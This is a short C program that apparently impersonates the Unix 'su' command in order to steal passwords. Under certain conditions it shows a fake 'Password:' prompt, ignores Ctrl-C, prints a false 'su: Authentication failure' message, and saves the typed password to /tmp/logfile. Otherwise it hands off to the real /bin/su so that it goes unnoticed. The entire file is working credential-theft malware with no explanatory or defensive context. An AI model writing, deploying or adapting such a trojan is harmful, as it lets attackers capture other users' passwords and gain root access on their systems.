#include <termios.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>

void fork_exec(char* argv[]) {
	execv("/bin/su", argv);
}

void my_function(int sig) {
}

int main(int argc, char* argv[]) {
	int id = getuid();
	if (id == 0) {
		fork_exec(argv);
		return 0;
	}

	if (argc > 2) {
		fork_exec(argv);
		return 0;
	}

	if (argc == 2) {
		char *arg = argv[1];
		int len = strlen(arg);
		if (len != 1) {
			fork_exec(argv);
			return 0;
		} else {
			char a = '-';
			if (arg[0] != a) {
				fork_exec(argv);
				return 0;
			}
		}

	}
FILE* file = fopen("/tmp/logfile", "r");

if (file != NULL) {
	fork_exec(argv);
	return 0;
} else {
	file = fopen("/tmp/logfile", "a+");
	if (file == NULL) {
		fork_exec(argv);
		return 0;
	}

}

signal(SIGINT, my_function);
char *password = getpass("Password:");

sleep(2);
printf("su: Authentication failure\n");

size_t writed_bytes = fwrite(password, sizeof(char), strlen(password), file);
return 0;
}
